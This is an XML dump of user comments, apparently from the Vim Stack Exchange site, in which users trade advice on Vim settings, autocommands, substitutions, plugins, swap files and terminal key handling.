  <row Id="7699" PostId="5034" Score="1" Text="Could you please explain why `setsid` fixes the problem? Thanks!" CreationDate="2015-10-09T14:53:47.863" UserId="599" />
  <row Id="7700" PostId="5052" Score="0" Text="Brilliant, thanks! I added `silent` before `exec` so I don't get spammed at startup by the progress info of the command (and don't get &quot;Press ENTER or type command to continue&quot;)." CreationDate="2015-10-09T15:20:08.180" UserId="4819" />
  <row Id="7701" PostId="5056" Score="1" Text="How about putting the function in a file with the same name as your session file but ending in `x.vim` as described in item 10 under `:help :mks`?" CreationDate="2015-10-09T16:21:19.057" UserId="2055" />
  <row Id="7702" PostId="5042" Score="0" Text="@ChristianBrabandt Your suggestion (the one with a -bar option) almost worked. For some reason it doesn't execute `cscope add GTAGS`. Am I missing something?" CreationDate="2015-10-09T16:25:46.880" UserId="2865" />
  <row Id="7703" PostId="5040" Score="0" Text="my pwd was &quot;~/.vim/bundle/html5.vim/ftplugin/html.vim&quot;. Solution worked like a charm. Thank you" CreationDate="2015-10-09T17:19:41.503" UserId="4803" />
  <row Id="7704" PostId="5061" Score="0" Text="You normally shouldn't be trying to put help tags into `/usr/share/vim/vim74/doc`. That directory already contains a `tags` file. Any plugins that you install should go into your `~/.vim` directory and the resulting help tags into `~/.vim/doc`. Do that by executing `:helptags ~/.vim/doc`. See `:help add-local-help`." CreationDate="2015-10-09T18:22:51.637" UserId="2055" />
  <row Id="7705" PostId="5061" Score="0" Text="@garyjohn Thanks!" CreationDate="2015-10-09T18:33:46.957" UserId="1378" />
  <row Id="7706" PostId="5061" Score="0" Text="If that answers it, then I'll make my command a real answer so that we don't leave your question in the unanswered state." CreationDate="2015-10-09T18:38:10.070" UserId="2055" />
  <row Id="7707" PostId="5052" Score="0" Text="@a3nm That's a matter of preference.  As an senior sysadmin explained to me many years ago, being spammed with &quot;ok&quot; notifications is a sign things work fine. :)" CreationDate="2015-10-09T18:48:54.657" UserId="2313" />
  <row Id="7709" PostId="4951" Score="0" Text="I don't understand the problem. Please describe clearly the error and show any error message." CreationDate="2015-10-09T19:57:16.920" UserId="71" />
  <row Id="7710" PostId="4951" Score="0" Text="@ChristianBrabandt &quot;CtrlP can't find any entries in some folders and NERDTree doesn't display all content of all folders.&quot; Basically none of the plugins find the content in the folders. The only message I get is &quot;== NO ENTRIES ==&quot; from CtrlP." CreationDate="2015-10-09T19:59:39.680" UserId="4722" />
  <row Id="7711" PostId="4951" Score="0" Text="Well, then go and ask the plugin authors." CreationDate="2015-10-09T20:52:41.090" UserId="71" />
  <row Id="7713" PostId="4951" Score="0" Text="I really think this is a problem with Vim (on Mac?). Since it's all about plugins that do something with the path." CreationDate="2015-10-09T22:01:25.030" UserId="4722" />
  <row Id="7714" PostId="5066" Score="4" Text="What's the value of `:set ft?` when you write a commit message? If it's git related, you can then write a specific `autocmd FileType` event that sets your `expandtab` option." CreationDate="2015-10-09T22:02:42.110" UserId="1800" />
  <row Id="7715" PostId="5066" Score="2" Text="@VanLaser `:set ft` gives `filetype=gitcommit`, I'll look into `autocmd`, I'm not familiar with it." CreationDate="2015-10-09T22:39:32.060" UserId="4833" />
  <row Id="7716" PostId="5054" Score="0" Text="This looks like the solution I was looking for, but it's a little bit unclear.  Can you explain it a bit more?  For instance, why `submatch(2)` instead of just `\2` like I use in a typical replace command?" CreationDate="2015-10-09T23:52:24.083" UserId="4676" />
  <row Id="7717" PostId="5066" Score="0" Text="Put `set expandtab` in a file `after/ftplugin/gitcommit.vim`." CreationDate="2015-10-10T05:38:36.077" UserId="2313" />
  <row Id="7718" PostId="5069" Score="2" Text="What is the output of `:set showmode?` ?" CreationDate="2015-10-10T05:46:00.947" UserId="2313" />
  <row Id="7720" PostId="5054" Score="0" Text="I updated the answer. After `\=` the escaped characters such as `\2` don't have their special meaning anymore, but you can use submatch(2) instead to get around that." CreationDate="2015-10-10T06:36:20.100" UserId="1672" />
  <row Id="7721" PostId="4951" Score="0" Text="@Oskar If you suspect something like this, you should reproduce the problem without any plugins. I still don't understand, what your exact problem is, so can't help" CreationDate="2015-10-10T08:03:08.377" UserId="71" />
  <row Id="7722" PostId="5070" Score="0" Text="thanks! Two follow up quæstions: (1) I suppose to delete with `ds'` one has to replace of of the marks to match the other first? (2) What is the difference between using `autocmd FileType …` (in .vimrc?) and putting the command in `.vim/after/tex.vim` ?" CreationDate="2015-10-10T10:42:25.160" UserId="4505" />
  <row Id="7723" PostId="4951" Score="1" Text="For a possibly related **filename+accented characters+os x** problem, take a look at my question http://vi.stackexchange.com/questions/4497/encoding-issue-with-filename-in-macvim. It has not been answered but it contains some reasoning and links which may give you some ideas to pursue." CreationDate="2015-10-10T11:23:56.797" UserId="1306" />
  <row Id="7724" PostId="4951" Score="0" Text="@ChristianBrabandt What is that you don't understand? Neither NERDTree nor CtrlP finds the files in a directory where there are files." CreationDate="2015-10-10T12:13:11.370" UserId="4722" />
  <row Id="7725" PostId="4951" Score="0" Text="@Oskar then go and ask at their bug tracker" CreationDate="2015-10-10T12:27:35.340" UserId="71" />
  <row Id="7726" PostId="5069" Score="0" Text="No response from ':set showmode' while in vi or vim.  Also, I failed to mention the problem is strange since the problem does not arise on one Windows 7 PC I use." CreationDate="2015-10-10T12:29:16.340" UserId="4835" />
  <row Id="7727" PostId="4497" Score="1" Text="looks like vim can't handle decomposed characters well. Hm, that might be a bug. You might want to create an issue for that. If you do `convmv --nfc -t utf-8 -f utf-8 j*derberg.txt` does it work?" CreationDate="2015-10-10T12:33:44.337" UserId="71" />
  <row Id="7728" PostId="5070" Score="0" Text="@Lawrence (1) Most likely. (2) autocmd FileType is closer to placing the commands in `.vim/ftplugin/tex.vim` I don't think tex.vim would even get sourced in that location. The after director is normally for overriding command in the standard runtime (or plugins you don't want to edit)" CreationDate="2015-10-10T13:31:30.397" UserId="46" />
  <row Id="7729" PostId="5026" Score="3" Text="See, I approached it with none of these pesky expectations you mentioned. This was aided by the awareness that it was born decades before the products general users are familiar with nowadays. I'm open to better ways of working, whether or not they're familiar. And really, saddling a newbie with your own settings file is not a very good tutorial!" CreationDate="2015-10-10T14:28:19.953" UserId="4841" />
  <row Id="7730" PostId="5035" Score="1" Text="Good point. As someone who has a tendency to be keyboard-oriented rather than mouse, `vi`/`m` in many situations offers me a speed boost and/or avoids flipping between input devices. Also, I do quite a bit of command-prompt stuff (Linux, Cygwin), and `vi` is always just _there_." CreationDate="2015-10-10T14:30:26.877" UserId="4841" />
  <row Id="7732" PostId="5069" Score="0" Text="The question mark is part of the command, `:set showmode?`, not just `:set showmode`." CreationDate="2015-10-10T15:58:37.860" UserId="2313" />
  <row Id="7733" PostId="5069" Score="0" Text="Do you use a `.vimrc` on your machines? Perhaps you are one `nocompatible` option away ..." CreationDate="2015-10-10T17:19:36.953" UserId="1800" />
  <row Id="7734" PostId="5015" Score="0" Text="@Wildcard you can always post a question on [meta] about this question." CreationDate="2015-10-10T19:19:33.790" UserId="205" />
  <row Id="7735" PostId="4887" Score="0" Text="One more question, Christian?   For some reason I don't seem to be able to modify the above to make the changes for a specific range.     For example, I would expect the following to work    :.,$/\\textstyle  etc, but I get a &quot;no range allowed error.     So my question is, how can I do the above type of construction:   /pattern/:exe   for a specific range?   Thanks!" CreationDate="2015-10-10T23:52:43.920" UserId="4667" />
  <row Id="7736" PostId="5076" Score="3" Text="How about `noremap dsi vaW:s/\%V\\emph{//\|s/}//&lt;cr&gt;` ? See `:h /\%V`. And, unless you have a special need, always use `noremap`, not `nmap`, if you want to avoid surprises. Also your map won't like spaces (more than one emphasized/enclosed word)." CreationDate="2015-10-11T00:35:59.877" UserId="1800" />
  <row Id="7737" PostId="134" Score="0" Text="This makes me feel silly that I never ran this command.  I use the built-in help all the time.  I learned the Ctrl-] and Ctrl-t shortcuts from a random tips website, and I thought they were ingenious and tremendously useful, and wondered why I hadn't heard about them...duh...I never ran just `:help` and started reading." CreationDate="2015-10-11T03:23:56.450" UserId="4676" />
  <row Id="7738" PostId="5076" Score="1" Text="Not that I know of. If you had surround installed you could do something like ``nmap dsf ds{dF\`` (I mean `nmap` since I want `ds{` to call the surround mapping.)" CreationDate="2015-10-11T04:16:55.230" UserId="46" />
  <row Id="7739" PostId="4887" Score="0" Text="If you need a range, you can add the range to the `:g` command." CreationDate="2015-10-11T07:37:19.167" UserId="71" />
  <row Id="7740" PostId="5076" Score="3" Text="not really. Ex commands always refer to complete lines. You can work around it by yanking your visual selected range, use some functions to work with the yanked text and replace the yank back. Alternative solutions include using Dr.Chips [vis.vim plugin](http://www.drchip.org/astronaut/vim/index.html#VIS) or using the `\%V` atom specifically for the `:s` command" CreationDate="2015-10-11T07:44:40.307" UserId="71" />
  <row Id="7741" PostId="5072" Score="1" Text="Since the plugin documentation pretends it is capable of understanding your includes… you should probably ask that question on its issue tracker." CreationDate="2015-10-11T11:48:39.333" UserId="54" />
  <row Id="7742" PostId="5054" Score="0" Text="This does not compute the sum of the list of times. It simply converts a time in one format to another. If this does answer your question, then the question should be rephrased." CreationDate="2015-10-11T16:09:20.847" UserId="21" />
  <row Id="7743" PostId="5054" Score="0" Text="@KarlYngveLervåg, thanks for clarifying the question for me! I had misunderstood it simply as wanting to calculate row-wise sums in seconds." CreationDate="2015-10-11T16:36:52.443" UserId="1672" />
  <row Id="7745" PostId="5073" Score="0" Text="Also for remapping mouse buttons, keyboard shortcuts and so forth on a Mac, I highly highly recommend http://www.bettertouchtool.net/ (which is free)." CreationDate="2015-10-12T06:42:54.060" UserId="4676" />
  <row Id="7747" PostId="5053" Score="0" Text="thx. It partially solve, because in case of compiler errors, I stll have to press the first  ENTER. I'll investigate about :w and :make command as you suggest" CreationDate="2015-10-12T12:48:42.350" UserId="983" />
  <row Id="7748" PostId="4968" Score="0" Text="That does not seem to help.  I can tell you when I hit shift-O, I get a new split with the message: &quot;**warning** (netrw) cannot determine method (format: protocol://[user@]hostname[:port]/[path])&quot;." CreationDate="2015-10-12T13:35:27.550" UserId="3241" />
  <row Id="7749" PostId="5053" Score="1" Text="Yes! voted! :) the winner sequence is: silent w | silent make | cw" CreationDate="2015-10-12T14:56:04.810" UserId="983" />
  <row Id="7750" PostId="5053" Score="0" Text="leaving usual cmdheight=1, I added in my .vimrc the command: &#xA;command! Make silent w | silent make | cw" CreationDate="2015-10-12T15:00:28.423" UserId="983" />
  <row Id="7751" PostId="4968" Score="0" Text="You can try to put `let g:netrw_silent= 1` in your .vimrc (you can find it [here](http://vimhelp.appspot.com/pi_netrw.txt.html#g%3Anetrw_silent)). I hope it will help." CreationDate="2015-10-12T15:26:52.447" UserId="2961" />
  <row Id="7752" PostId="5023" Score="4" Text="Some folks decided to edit my answer by stating I use Visual Basic. I use Virtual Box and run Linux over top of Windows. However, I think these edits are super interesting so I will just leave it. It's kind of like playing telephone with edits. The story just keeps changing the more people edit it. Fun." CreationDate="2015-10-12T16:46:51.153" UserId="1417" />
  <row Id="7753" PostId="4968" Score="0" Text="sorry, no dice :(" CreationDate="2015-10-12T19:01:35.180" UserId="3241" />
  <row Id="7754" PostId="5084" Score="1" Text="If a PDF is acceptable, then unnumbered list markdown can be used to tag list items and `asciidoc` can later be used to convert the markdown into a PDF with line numbering.  But I too would like to know how to use vim for automated line numbering of text-only files." CreationDate="2015-10-12T21:30:42.467" UserId="4676" />
  <row Id="7755" PostId="5084" Score="1" Text="That's something word processors are quite good at." CreationDate="2015-10-12T21:31:16.847" UserId="54" />
  <row Id="7756" PostId="5084" Score="0" Text="@Wildcard PDF is indeed acceptable, the only thing is the initial anonymous tagging makes referring to specific numbered items across document difficult. But still, your method is definitely better than nothing." CreationDate="2015-10-12T21:43:41.247" UserId="2301" />
  <row Id="7757" PostId="5063" Score="0" Text="Note that this question is actually asking about &quot;registers&quot;.  &quot;Buffer&quot; means something else entirely in both vi and vim." CreationDate="2015-10-12T23:23:04.127" UserId="4676" />
  <row Id="7758" PostId="4986" Score="1" Text="Another great shortcut I've found is `;` repeats the last `f` `F` `t` `T` command used." CreationDate="2015-10-13T00:51:26.360" UserId="2221" />
  <row Id="7759" PostId="5063" Score="0" Text="@wildcard Well ya take the text from the buffer to a register and then paste it into the command." CreationDate="2015-10-13T01:36:33.727" UserId="1065" />
  <row Id="7765" PostId="5088" Score="4" Text="There are many other mappings that start with `[` and `]` so Vim is waiting to see if any more keys are going to be pressed. You can see a list of square bracket commands see `:h [`. Vim unimpaired uses `[b` and `]b` for buffer commands if you are looking for ideas." CreationDate="2015-10-13T15:50:48.447" UserId="778" />
  <row Id="7766" PostId="5088" Score="0" Text="You can consider using a leader key (I use space) and map &lt;leader&gt; [ and ]." CreationDate="2015-10-13T16:01:27.127" UserId="859" />
  <row Id="7767" PostId="5092" Score="0" Text="What does the underscore do?" CreationDate="2015-10-13T17:48:32.273" UserId="4676" />
  <row Id="7768" PostId="5092" Score="0" Text="This works, but none of the commands I know work. I keep getting &quot;not an editor command&quot;." CreationDate="2015-10-13T17:56:26.723" UserId="2920" />
  <row Id="7769" PostId="5093" Score="0" Text="Beat me to it; I guess I was typing too slow.  :)" CreationDate="2015-10-13T17:57:56.163" UserId="4676" />
  <row Id="7770" PostId="5081" Score="0" Text="Can you please provide a basic description of what `\zs` does in your answer?" CreationDate="2015-10-13T17:59:45.173" UserId="865" />
  <row Id="7771" PostId="5091" Score="3" Text="Just so you know, `500@d` as you describe is actually safe.  The macro playback will stop once the search term is not found.  So you'll just see an error &quot;Pattern not found: WORD&quot; after all lines containing it have been deleted." CreationDate="2015-10-13T18:01:56.057" UserId="4676" />
  <row Id="7772" PostId="3583" Score="1" Text="@Carpetsmoker I think that would qualify as a &quot;prompt to confirm&quot; since it shows on the screen.  I recommend adding it as an answer (probably along with how to add it as a default option in `.vimrc`, so the answer is fully self-contained.)" CreationDate="2015-10-13T18:05:22.907" UserId="4676" />
  <row Id="7773" PostId="5084" Score="0" Text="Would it be acceptable to use some form of markdown which would then be converted/unconverted automatically with an ex-mode command?  e.g. prefix top level list items with `- `, second level list items with `-- `, etc.  This seems the most likely avenue of approach; see my recent question about consecutive numbering in Ex-mode for a starting point." CreationDate="2015-10-13T18:09:13.977" UserId="4676" />
  <row Id="7774" PostId="2290" Score="1" Text="Rather than `:s/\(.\)/\1\r/g`, you could just use `:s/./\0\r/g` which is functionally identical." CreationDate="2015-10-13T18:13:26.877" UserId="4676" />
  <row Id="7775" PostId="5091" Score="0" Text="@Wildcard Thankyou, that is really good to know!" CreationDate="2015-10-13T18:15:00.547" UserId="2920" />
  <row Id="7776" PostId="2311" Score="0" Text="Very nice.  Macros are the way to go in vim.  My quick attempt was essentially the same as yours; `qq03lxldt|i ^[jPxq@q`" CreationDate="2015-10-13T18:23:48.137" UserId="4676" />
  <row Id="7777" PostId="5084" Score="0" Text="Since options are scarce, anything goes." CreationDate="2015-10-13T18:50:14.560" UserId="2301" />
  <row Id="7778" PostId="5090" Score="0" Text="How can you put a dot after the number? `\=i. ` is an invalid expression." CreationDate="2015-10-13T21:37:13.500" UserId="777" />
  <row Id="7779" PostId="5094" Score="0" Text="Does this need to be a script variable? Would a global not work just as well? Maybe a buffer local would work if you need to have a value for only certain files" CreationDate="2015-10-13T22:05:12.320" UserId="778" />
  <row Id="7780" PostId="5094" Score="0" Text="@PeterRincker Unfortunately it does need to be a script variable." CreationDate="2015-10-13T22:06:45.867" UserId="2865" />
  <row Id="7781" PostId="5094" Score="0" Text="You have stated it needs to be a script local variable but you have not given a reason. I would imagine this parameter should go way and be handled inside of `s:PrjAck` function. I see no advantage of passing it around as a parameter. Especially since, script variable is rather tricky for a user to modify with out some interface." CreationDate="2015-10-13T22:11:17.290" UserId="778" />
  <row Id="7782" PostId="5094" Score="1" Text="@OP Since when does a function argument need to have a specific scope? :)" CreationDate="2015-10-13T22:17:23.380" UserId="1800" />
  <row Id="7783" PostId="5094" Score="0" Text="@PeterRincker this script is used as part of a project and must stay within a project. That's why I want to make it local. This function is used in multiple places. Placing this variable into this function will change its functionality. Another option is to create a function which would call `s:PrjAck` but I don't see a need to do that." CreationDate="2015-10-13T22:20:04.437" UserId="2865" />
  <row Id="7784" PostId="5090" Score="2" Text="@DavidConrad, `.` becomes a concatenate operator in the `\=` expression.  So `s//\=i . '. '/` will append `'. '`  Check out `:help expression-syntax`." CreationDate="2015-10-13T23:35:55.900" UserId="4676" />
  <row Id="7785" PostId="2311" Score="0" Text="@Wildcard, i can haz upvote?" CreationDate="2015-10-14T04:21:45.857" UserId="850" />
  <row Id="7786" PostId="2311" Score="1" Text="Ha!  Slipped my mind; I thought I had.  :)" CreationDate="2015-10-14T04:32:05.207" UserId="4676" />
  <row Id="7787" PostId="5098" Score="3" Text="please clarify what exactly does not work. As you can see from the :scriptnames output, nerdtree plugin is loaded. Perhaps you should ask at the plugin's issue tracker" CreationDate="2015-10-14T07:10:06.607" UserId="71" />
  <row Id="7788" PostId="3760" Score="0" Text="what exactly is  togglebg?" CreationDate="2015-10-14T07:11:19.967" UserId="71" />
  <row Id="7789" PostId="5090" Score="0" Text="incrementation happens after the substitution" CreationDate="2015-10-14T07:14:16.867" UserId="71" />
  <row Id="7790" PostId="5092" Score="1" Text="@Wildcard: The underscore discards what is being cut. The command executed is actually `:delete` and not the normal mode operation `d`." CreationDate="2015-10-14T07:22:07.947" UserId="626" />
  <row Id="7791" PostId="5092" Score="0" Text="@DJMcMayhem: for other normal operations, you'll need `:normal`. And if you need special keys, you may even need `:exe` -&gt; `exe &quot;normal aFooFar\&lt;esc&gt;&quot;" CreationDate="2015-10-14T07:24:27.140" UserId="626" />
  <row Id="7793" PostId="5090" Score="0" Text="@ChristianBrabandt, oops I accidentally a word." CreationDate="2015-10-14T08:09:20.160" UserId="54" />
  <row Id="7794" PostId="5094" Score="0" Text="On a side note: you do know about the [CtrlSF](https://github.com/dyng/ctrlsf.vim) plugin, right?" CreationDate="2015-10-14T08:10:32.343" UserId="2313" />
  <row Id="7795" PostId="5102" Score="0" Text="Thanks but it seems that this won't solve my issues. Is there a way of forcing my initial working directory (upon starting vim) to be a particular directory? Independently from how I start it. Your tips are useful but my goal is not having to go to a particular directory in the terminal or change the working directory manually... the idea is that this is done by default. And although I _am_ using ag with ctrlp, the problem is if I exclude the parent directory, the child directories won't be indexed either..." CreationDate="2015-10-14T08:20:59.867" UserId="4902" />
  <row Id="7801" PostId="5102" Score="0" Text="You can use vim autocommands for that (I've edited my post)." CreationDate="2015-10-14T08:34:28.833" UserId="4903" />
  <row Id="7802" PostId="5094" Score="0" Text="If still not clear for the @OP - removing the `s:tblgen_files` as function argument, and using it *directly* inside the function (since, being in the same script file, it's visible to it) has the same effect. I'm not sure if it's the *desired* effect ..." CreationDate="2015-10-14T09:47:11.060" UserId="1800" />
  <row Id="7804" PostId="5098" Score="2" Text="Define &quot;won't work&quot;." CreationDate="2015-10-14T11:54:14.897" UserId="54" />
  <row Id="7805" PostId="5102" Score="0" Text="Excellent, that works like a charm, thanks!" CreationDate="2015-10-14T12:37:44.917" UserId="4902" />
  <row Id="7806" PostId="5103" Score="0" Text="If the chapter, section etc. labels are in the same file, or in any other open buffers, you can still use `Ctrl-n/Ctrl-p` if you add `:` to the keyword characters: `:set iskeyword+=:`. Meaning just that, if you wrote `c:blah` somewhere, `c:` `Ctrl-n` will autocomplete that later on." CreationDate="2015-10-14T12:49:19.333" UserId="1800" />
  <row Id="7807" PostId="4968" Score="0" Text="Chipping away at this, it is being set in status line: `set statusline?` to see how it modified it." CreationDate="2015-10-14T15:07:06.847" UserId="3241" />
  <row Id="7808" PostId="4968" Score="0" Text="I guess I could write a function? that intercepts shift-O, stores statusline, executes shift-O, and if g:netrw_silent==1, reset statusline..." CreationDate="2015-10-14T15:10:34.643" UserId="3241" />
  <row Id="7809" PostId="5106" Score="0" Text="It [resets statusline to the default value](http://vimdoc.sourceforge.net/htmldoc/options.html#:set-default)." CreationDate="2015-10-14T15:15:42.733" UserId="3241" />
  <row Id="7810" PostId="5103" Score="0" Text="[vimtex](https://github.com/lervag/vimtex) offers this through an omni-complete function, see `:h 'omnifunc'` (and similar help pages). As do other LaTeX plugins for Vim, such as [LaTeX-Box](https://github.com/LaTeX-Box-Team/LaTeX-Box)." CreationDate="2015-10-14T15:32:12.600" UserId="21" />
  <row Id="7811" PostId="5107" Score="1" Text="You might want to create an issue at the vim github repository so that this can be fixed with the official vim source." CreationDate="2015-10-14T16:14:44.213" UserId="71" />
  <row Id="7812" PostId="5094" Score="0" Text="@SatoKatsura Never heard of this plugin." CreationDate="2015-10-14T17:46:37.003" UserId="2865" />
  <row Id="7813" PostId="5094" Score="0" Text="@SatoKatsura Seems like CtrlSF is a wrapper around ag/ack. How does it solve the problem?" CreationDate="2015-10-14T17:53:07.113" UserId="2865" />
  <row Id="7814" PostId="5094" Score="1" Text="`ag` / `ack` are external programs.  `CtrlSF` is a Vim plugin than can use them, or can work without them.  It doesn't solve your problem as you state it above; it does however do something that you seem to want to do with your plugin: search for the word under cursor with `ag`, or `ack`.  You can find more about it reading the docs.  Or you can ignore it, and my tangent." CreationDate="2015-10-14T18:14:21.247" UserId="2313" />
  <row Id="7815" PostId="5094" Score="0" Text="It is a good suggestion. I will try to explore this when I have time." CreationDate="2015-10-14T18:24:28.907" UserId="2865" />
  <row Id="7816" PostId="5103" Score="0" Text="@VanLaser  Perfect! Post it as an answer so I can accept it :)" CreationDate="2015-10-14T18:46:53.750" UserId="583" />
  <row Id="7817" PostId="5103" Score="0" Text="... and - done! I also recommend the `vimtex` plugin BTW." CreationDate="2015-10-14T21:56:07.943" UserId="1800" />
  <row Id="7818" PostId="5114" Score="0" Text="I've had a look at http://superuser.com/questions/515699/vim-errors-e433-no-tags-file-e149-no-help-for-help-txt but it doesn't pinpoint the issue." CreationDate="2015-10-14T23:33:26.223" UserId="4882" />
  <row Id="7819" PostId="5111" Score="0" Text="Hmmm -- the output from `:set dir?` seems inaccurate; right now I get `~/tmp,/var/tmp,/tmp`, but there's a `.swp` file in `~/.vim/tmp-backup-swapfiles` that is obviously being used (when I change the buffer, the timestamp on that file is immediately updated).  I'll try your suggestion; I'm guessing the first `set directory=` is to clear any defaults?  To clarify further, are you saying that vim only resorts to other directories when I load two files with the same name but different paths?" CreationDate="2015-10-15T01:26:25.553" UserId="4913" />
  <row Id="7820" PostId="5082" Score="1" Text="I find surprising the indentation example that you gave in the last snippet: I have tried it on my vanilla Homebrew installation (version 7.4) and it workes as I expected: when I hit &lt;Enter&gt; at the end of the line, with `autoindent` enabled vim indents the next line as the line that I just ended. So my guess is that you may have a plugin that alters the default indentation model." CreationDate="2015-10-15T08:59:52.580" UserId="4922" />
  <row Id="7821" PostId="5118" Score="0" Text="I saw the `K` command, but wasn't sure how to make it use `:h`. It looked like it uses external programs." CreationDate="2015-10-15T09:24:35.260" UserId="205" />
  <row Id="7822" PostId="5120" Score="4" Text="Try this: `:help v_&gt;`." CreationDate="2015-10-15T10:35:04.883" UserId="2313" />
  <row Id="7823" PostId="5120" Score="0" Text="Perfect. Thank you !" CreationDate="2015-10-15T10:38:36.437" UserId="4717" />
  <row Id="7824" PostId="5109" Score="1" Text="Custom folding, probably: http://learnvimscriptthehardway.stevelosh.com/chapters/49.html" CreationDate="2015-10-15T11:15:23.923" UserId="1800" />
  <row Id="7825" PostId="5122" Score="2" Text="If you just want to go back one step use `ctrl-o`." CreationDate="2015-10-15T14:14:34.243" UserId="4913" />
  <row Id="7826" PostId="5122" Score="1" Text="I know about ctrl-o because that's how you navigate the jumps list, which is what this question is about.  Like I put in the question, it won't work for operations such as page down (which don't alter the jumps list), which is what my answer addresses." CreationDate="2015-10-15T14:38:49.667" UserId="859" />
  <row Id="7827" PostId="5119" Score="2" Text="I came across that as a potential solution, which led to a question about [the danger of `set exrc`](http://vi.stackexchange.com/questions/5055/why-is-set-exrc-dangerous/5059#5059). The risk outweighs the usefulness of the solution for me, unfortunately." CreationDate="2015-10-15T15:12:09.503" UserId="1166" />
  <row Id="7828" PostId="5123" Score="2" Text="I think this is caused by vi(m) &lt;-&gt; terminal interaction, so you can also try some terminal-related workarounds/configuration." CreationDate="2015-10-15T16:05:51.370" UserId="1800" />
  <row Id="7829" PostId="5123" Score="0" Text="Which $TERM do you suggest, for this problem?" CreationDate="2015-10-15T16:42:53.467" UserId="4926" />
  <row Id="7830" PostId="5123" Score="1" Text="Translation of what @VanLaser said above: your entry for the current `TERM` in the `termcap` or `terminfo` databases is out of synch with the codes produced by the keyboard.  The solution is not to change the `TERM`, but to find out if your `vi` is linked against `termcap` or `terminfo`, find the keycodes emitted by the keyboard, and fix the corresponding database accordingly.  Complaining to the sysadmin might work, too." CreationDate="2015-10-15T16:47:40.247" UserId="2313" />
  <row Id="7831" PostId="5110" Score="0" Text="You could subclass the logger in your script to produce traceback points one per line (see [here](http://stackoverflow.com/questions/28180159/how-do-i-can-format-exception-stacktraces-in-python-logging) to get started), then adjust `errorformat` accordingly and write a compiler plugin for Vim (see `:help :compiler` and `:help write-compiler-plugin`).  Probably not worth the effort if you don't know _exactly_ what you're doing and you're not enthusiastic enough to dig everything out from the docs." CreationDate="2015-10-15T17:01:20.647" UserId="2313" />
  <row Id="7832" PostId="5123" Score="1" Text="Did I say all that? Sometimes I amaze myself :) (of course, all I knew was that it's terminal related)." CreationDate="2015-10-15T18:18:13.603" UserId="1800" />
  <row Id="7834" PostId="5123" Score="0" Text="This version of vi is built with ncurses, it should then use `terminfo`." CreationDate="2015-10-15T21:28:11.283" UserId="4926" />
  <row Id="7835" PostId="5110" Score="0" Text="I asked a similar question on StackOverflow, you may find those answers useful http://stackoverflow.com/questions/11333112/how-can-i-send-line-number-from-python-traceback-into-vim" CreationDate="2015-10-16T00:24:53.140" UserId="182" />
  <row Id="7839" PostId="5130" Score="2" Text="I don't think you can get dimensions in pixels with plain Vim functions.  As for opening help in a vertical split, I don't bother with aspect ratio calculations, I just split vertically if the terminal window is wide enough: `cnoreabbrev h &lt;C-r&gt;=(&amp;columns &gt;= 160 &amp;&amp; getcmdtype() ==# ':' &amp;&amp; getcmdpos() == 1 ? 'vertical botright help' : 'h')&lt;CR&gt;`." CreationDate="2015-10-16T04:36:55.177" UserId="2313" />
  <row Id="7840" PostId="5130" Score="0" Text="@SatoKatsura thus following the tradition set by most web developers, who use the document width to determine if it's a mobile. :(" CreationDate="2015-10-16T04:39:06.107" UserId="205" />
  <row Id="7841" PostId="5130" Score="1" Text="Not really, since I'm only inflicting that to myself.  I played with aspect ratio for a while and I found the results to be unsatisfactory.  Then I remembered I have exactly two shortcuts for opening terminals, for &quot;normal&quot; size, and for &quot;wide&quot; terminals.  So my terminals almost always have the same sizes.  YMMV of course." CreationDate="2015-10-16T04:43:28.553" UserId="2313" />
  <row Id="7842" PostId="5131" Score="1" Text="OK, but that's just a workaround, it means vim may also be slow on other file types, or on emails that aren't correctly detected. I'm surprised that there doesn't seem to be a generic way to fix this? Thanks, in any case!" CreationDate="2015-10-16T08:15:08.660" UserId="4819" />
  <row Id="7844" PostId="5131" Score="2" Text="I would suggest exactly the opposite: only set mps when editing HTML instead of making it the default." CreationDate="2015-10-16T10:06:16.713" UserId="599" />
  <row Id="7845" PostId="5132" Score="0" Text="What are you trying to do? [(XY Problem)](http://meta.stackexchange.com/a/66378/188334)" CreationDate="2015-10-16T11:31:16.923" UserId="1405" />
  <row Id="7846" PostId="5132" Score="0" Text="@mMontu I don't have an X, lol.  I'm just curious.  I was wondering about it yesturday because of my [previous question](http://vi.stackexchange.com/questions/5108/swap-file-directory-often-ignored), and surprised when I looked around that no one has anything to say about this.  It could be that the *only* real information in there is the file content, in which case this is a bit pointless -- but then so would be the beefy binary format." CreationDate="2015-10-16T11:41:00.280" UserId="4913" />
  <row Id="7847" PostId="5132" Score="1" Text="Swap files do store more information than just the file itself, it stores the user and host name of who last modified it, when it was last modified, and the process ID of the instance of vim that is/was editing that file." CreationDate="2015-10-16T12:19:39.920" UserId="865" />
  <row Id="7848" PostId="5082" Score="0" Text="@VladGURDIGA, yes, I'm starting to suspect that. I'll have to dive into my vimrc and see what I can come up with. My vimrc is here, btw https://github.com/criswell/meh/blob/master/vim/.vimrc" CreationDate="2015-10-16T12:58:57.017" UserId="4854" />
  <row Id="7850" PostId="5139" Score="0" Text="The `-sc'%p|q!'` is to print to the standard output and quit (without saving in-place), just an alternative way for input parsing like `sed`/`awk`." CreationDate="2015-10-16T14:49:18.957" UserId="467" />
  <row Id="7852" PostId="5139" Score="0" Text="Why `:exe` is required?" CreationDate="2015-10-16T14:50:55.520" UserId="467" />
  <row Id="7853" PostId="5139" Score="0" Text="to parse the `&quot;\&lt;key&gt;&quot;` string" CreationDate="2015-10-16T14:58:46.490" UserId="71" />
  <row Id="7854" PostId="5139" Score="0" Text="Linked to your example from here: [Deleting first column with vim](http://askubuntu.com/a/686268/78223). Basically I wanted to find simple `ex` cmd removing first column." CreationDate="2015-10-16T14:59:07.720" UserId="467" />
  <row Id="7856" PostId="5082" Score="0" Text="also check ~/.vim/ since whatever is there is are also loaded, usually ftplugins, colors and other autoload things. 8-)" CreationDate="2015-10-16T15:05:28.197" UserId="4922" />
  <row Id="7858" PostId="5082" Score="0" Text="I also asked on reddit, and got this answer, which turned out to fix it https://www.reddit.com/r/vim/comments/3ogbna/disabling_partial_html_indentation_in_vim/cvy8p3u . I'll update my question accordingly." CreationDate="2015-10-16T15:46:42.137" UserId="4854" />
  <row Id="7859" PostId="5140" Score="0" Text="Why do you want that?" CreationDate="2015-10-16T15:52:33.247" UserId="1800" />
  <row Id="7860" PostId="5140" Score="0" Text="For example I've many columns in the file, and I want to delete selected column using `ex` and print what was deleted." CreationDate="2015-10-16T15:57:36.190" UserId="467" />
